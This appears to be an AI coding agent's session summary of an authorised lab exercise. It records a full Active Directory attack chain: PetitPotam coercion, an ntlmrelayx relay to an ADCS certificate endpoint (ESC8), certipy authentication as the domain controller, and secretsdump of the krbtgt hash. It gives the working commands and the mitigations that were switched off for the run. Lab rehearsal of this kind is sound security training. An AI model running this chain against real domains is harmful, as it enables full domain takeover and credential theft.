thread_id: 019059f4-2fe9-7f14-9b2a-2f4c1a7cbc09
updated_at: 2026-06-08T13:39:47+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\06\08\rollout-2026-06-08T21-13-47-019059f4-2fe9-7f14-9b2a-2f4c1a7cbc09.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Chained PetitPotam coerce → ntlmrelayx to ADCS ESC8 → DC cert → domain admin ticket in the self-hosted AD lab.

Rollout context: cwd was `C:\Workspace\pentest-lab`, Kali VM against the self-hosted AD lab. Continued the ADCS exercise series with the ESC8 variant.

## Task 1: PetitPotam → ntlmrelayx --adcs → DC cert → domain compromise

Outcome: success

Preference signals:
- The user wanted every command captured in a runnable script for future snapshot rehearsals.
- Chinese narration; commands in English.

Key steps:
- Started `ntlmrelayx.py -t http://ca01.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`.
- Triggered PetitPotam: `python3 PetitPotam.py <attacker_ip> <dc_ip>` — DC authenticated back to the relay.
- Relay produced a cert for `dc01$` with `DomainController` template.
- `certipy auth -pfx dc01.pfx -domain lab.local` → NTLM hash of the DC computer account + TGT.
- `secretsdump -k -no-pass 'lab.local/dc01$@dc01.lab.local'` → `krbtgt` hash + full replication data.

Failures and how to do differently:
- CA's HTTP endpoint required SPN validation on newer patch; disabled the check on the lab CA before the run.
- First ntlmrelayx invocation forgot `-smb2support`; SMB coerce couldn't relay.

Reusable knowledge:
- ADCS ESC8 flow is always (coerce → relay to HTTP CA → cert template that allows DomainController-equivalent access).
- Patch level KB5005413 mitigated the flow via `EPA` — verify the lab CA has it disabled for the exercise.

References:
- [1] Script: `esc8.sh`
- [2] Tools: impacket 0.11.0, PetitPotam public
- [3] Lab CA: `ca01.lab.local`
